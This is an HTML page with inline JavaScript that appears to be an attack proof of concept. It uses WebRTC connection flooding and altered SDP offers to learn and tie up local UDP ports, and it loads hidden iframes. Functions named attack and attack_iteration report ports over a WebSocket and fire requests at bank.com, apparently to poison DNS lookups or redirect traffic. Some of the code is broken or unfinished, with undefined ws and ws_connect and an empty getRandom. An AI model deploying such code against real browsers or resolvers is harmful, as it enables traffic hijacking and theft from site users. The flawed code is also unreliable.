<!DOCTYPE html>
<html>
    <head>
        <script charset="utf-8" type="text/javascript">
            function createConnection(connectionStateChangedEventHandler=null)
            {
                return createConnections(1, 1, null, false, 0, connectionStateChangedEventHandler);
            }

            function getPort(rtcPeerConnection)
            {
                sdp = rtcPeerConnection.localDescription.sdp.split("\n");
                candidate = sdp.filter(i => i.startsWith("a=candidate"));
                console.log(candidate[0].split(/\s+/));
                return candidate[0].split(/\s+/)[5];
            }

            function createConnections(connectionCount, dataChannelCount, servers, munge=false, offs=0, connectionStateChangedEventHandler=null)
            {
                let cnContainer =
                {
                    connections:
            	{
            	    local: [],
            	    remote: []
            	},

            	ports:
            	{
            	     local: [],
            	     remote: []
            	},

            	channels:
            	{
                         send: [],
            	     receive: []
            	}
                }

                let lCon = cnContainer.connections.local;
                let lPort = cnContainer.ports.local;
                let rCon = cnContainer.connections.remote;
                let rPort = cnContainer.ports.remote;
                let sendChannels = cnContainer.channels.send;
                let receiveChannels = cnContainer.channels.receive;


                for(let i=0; i<connectionCount; i++)
                {
                   with(cnContainer)
                   {
                       connections.local.push(new RTCPeerConnection(servers));
                       ports.local.push(0);
                       connections.remote.push(new RTCPeerConnection(servers));
                       ports.remote.push(0);
                   }

                   lCon[i].onicecandidate = e => onIceCandidate(rCon[i], e);
                   lCon[i].oniceconnectionstatechange = e =>  onConnectionStateChange(e, cnContainer, i, "LCON", connectionStateChangedEventHandler);
                   rCon[i].onicecandidate = e => onIceCandidate(lCon[i], e);
                   rCon[i].oniceconnectionstatechange = e =>  onConnectionStateChange(e, cnContainer, i, "RCON", connectionStateChangedEventHandler);

                   rCon[i].ondatachannel = ev =>
                   {
                       let ch = ev.channel;
                       ch.onmessage = onMessage;
                       ch.onopen = onChannelStateChange;
                       ch.onclose = onChannelStateChange;
                       receiveChannels.push(ch);
                   }


                   sendChannels = sendChannels.concat(createChannels(lCon[i], i, munge ? 1 : dataChannelCount));
                   lCon[i].createOffer()
                        .then((offer) => { onSuccessfulOffer(offer, lCon[i], rCon[i], munge ? dataChannelCount : null, offs)})
                    .catch(onFailedOffer);
                }

                console.log("Container: ", cnContainer);
                return cnContainer;
            }

            function sendData(channels, data)
            {
                for(let i=0; i<channels.length; i++)
                {
                   channels[i].send(data);
                }
            }

            async function onIceCandidate(remote, ev)
            {
                if(!ev.candidate)
                {
                  console.log("Rejected IceCandidate: none");
                  return;
                }
                else if(!ev.candidate.protocol === 'udp')
                {
                  console.log("Rejected IceCandidate: " + ev.candidate.candidate ? ev.candidate.candidate : 'none');
                  return;
                }

                try
                {
                    await(remote.addIceCandidate(ev.candidate));
                    console.log("Added IceCandidate: " + ev.candidate ? ev.candidate.candidate : 'none');
                }
                catch(e)
                {
                    console.error("Failed to add IceCandidate: " + e.toString());
                }
            }

            function mungeChannels(offer, mungeChannelCount, offs)
            {
                try
                {
            	const midx = offer.sdp.indexOf("m=");
            	const mdef = offer.sdp.substr(midx);
            	let sdp = offer.sdp;
            	sdp = sdp.replace("a=group:BUNDLE 0\r\n", "");
            	console.log(sdp);
            	for(let i=0; i < mungeChannelCount; i++)
            	{
            	    sdp += mdef.replace(/mid:\d+/, "mid:" + (10 + mungeChannelCount * offs + i));
            	}
            	offer.sdp = sdp;
            	return offer;
                }
                catch(e)
                {
                    console.error("Error munging channels: ", e.toString());
                }
            }

            async function onSuccessfulOffer(offer, lCon, rCon, mungeChannelCount=null, offs=0)
            {
                let mungeEnabled = Number.isInteger(mungeChannelCount) && mungeChannelCount >= 1;
                if(mungeEnabled)
                {
            	offer = mungeChannels(offer, mungeChannelCount, offs);
                }

                try
                {
                    await lCon.setLocalDescription(offer);
                	console.log("Successful offer: ", offer);
                }
                catch(e)
                {
                    console.error("Error adding local description. " + e.toString());
                }

                if(mungeEnabled)
                {
            	return;
                }

                try
                {
                    await rCon.setRemoteDescription(offer);
                }
                catch(e)
                {
                    console.error("Error adding remote description. " + e.toString());
                }

                try
                {
                    await onSuccessfulAnswer(await rCon.createAnswer(), lCon, rCon);
                }
                catch(e)
                {
                    console.error("Error answering RTC Offer. " + e.toString());
                }
            }

            async function onSuccessfulAnswer(desc, lCon, rCon)
            {
                try
                {
                    await lCon.setRemoteDescription(desc);
                }
                catch(e)
                {
                    console.error("Error applying local connection remote description from answer. " + e.toString());
                }

                try
                {
                    await rCon.setLocalDescription(desc);
                }
                catch(e)
                {
                    console.error("Error applying remote connection local description from answer. " + e.toString());
                }

            }

            function onFailedOffer()
            {
                console.error("RTCConnection failed.");
            }

            function onConnectionStateChange(ev, cnContainer, cnIndex, cnType, eventHandler)
            {
                if(cnType == "LCON")
                {
                    cn = cnContainer.connections.local[cnIndex];
                	cnContainer.ports.local[cnIndex] = getPort(cn);
            	if(eventHandler != null)
            	{
               	    eventHandler(cn, cnContainer.ports.local[cnIndex]);
                    }
                }
                else
                {
                    cn = cnContainer.connections.remote[cnIndex];
                    cnContainer.ports.remote[cnIndex] = getPort(cn);
            	if(eventHandler != null)
            	{
            	    eventHandler(cn, cnContainer.ports.remote[cnIndex]);
                    }
                }

                console.log(cnType + "_" + cnIndex + "_STATE: " + cn.iceConnectionState);
            }

            function onMessage(ev)
            {
                console.log(ev.data);
            }

            function onChannelStateChange(ev)
            {
                console.log(ev.currentTarget.label + ": " + ev.currentTarget.readyState);
            }

            function createChannels(conn, cidx, n)
            {
                console.log("Creating data channels");
                let channels = [];
                for(var i = 0; i < n; i++)
                {
                    try
                    {
                        var chName = "con_" + cidx + "_ch_" + i;
                        channels.push(conn.createDataChannel(chName));
                        channels[i].onmessage = e => console.log("Msg[" + chName + "]: " + e.data);
                    }
                    catch(e)
                    {
                        console.error("Could not create data channel: " + e.toString());
                    }
                }

                return channels;
            }




            const BASE_PORT = 2015
            const MAX_FRAMES = 5
            const PROTOCOL = "https"
            let forwarded = false;
            let attackInProgress = false;
            let attackPorts = [];
            let subDomIndex = 0;
            var peers = [];
            var block;

            function getRandom(min, max)
            {
                assert(min <= max);

            }
            async function go()
            {
                if(forwarded)
                    return;
                forwarded = true;
                const port = parseInt(document.location.port);
                const ipSuffix = parseInt(document.location.port - BASE_PORT + 1);
                await sleep(1000);
                addFrame("/", ipSuffix + 1, port + 1);
            }

            function addFrame(resource, ipSfx, port)
            {
                let target = PROTOCOL + "://[2001:db8::" + ipSfx.toString(16) + "]:" + port + resource;
                let frame = document.createElement("iframe");
                frame.src = target;
                frame.style.visibility = "hidden";
                document.body.appendChild(frame);
            }

            async function sleep(ms)
            {
                return new Promise(x => setTimeout(x, ms));
            }

            async function triggerDNSRequest(url)
            {
                try
                {
                    let req = new XMLHttpRequest();
                    req.open("GET", url);
                    req.send(null);
                }
                catch(e)
                {}
            }

            function attack_iteration(subDomain)
            {
                try {
                    ws.send(subDomain + ";" + attackPorts.join());
                }
                catch(e)
                {
                    ws_connect();
                    return;
                }

                triggerDNSRequest(PROTOCOL + "://bank.com/logo.png");
            }

            async function attack(connection, port)
            {
                for(let i=0; i < 6; i++)
                {
                    peers.push(createConnections(1, 10, null, true, 100 * i));
                    await sleep(500);
                }
                await sleep(4000);
                var portLabel = document.createElement("p");
                portLabel.innerHTML = port + "," + reserve.ports.remote[0];
                document.body.appendChild(portLabel);
                connection.close();

                attackPorts = [ port - 2, port - 1, port];
                attack_iteration("0xffff");

            }

            function connectionStateChangedEventHandler(connection, port)
            {
                if(connection == reserve.connections.local[0] &&
                   connection.iceConnectionState == "connected")
                {
                    attackInProgress = true;
                    peers.push(createConnections(1, 1500, null, true, location.port - 2015));
                    console.log("Port: ", port);
                    if(location.port == 2020)
                    {
                        attack(connection, port);
                    }
                    else
                    {
                        go();
                    }
                }
            }

            var reserve = createConnection(connectionStateChangedEventHandler);
            console.log("Reserve: ", reserve);

            async function main()
            {
                let port = parseInt(location.port);
            }

        </script>
        <script charset="utf-8" type="text/javascript">
        </script>
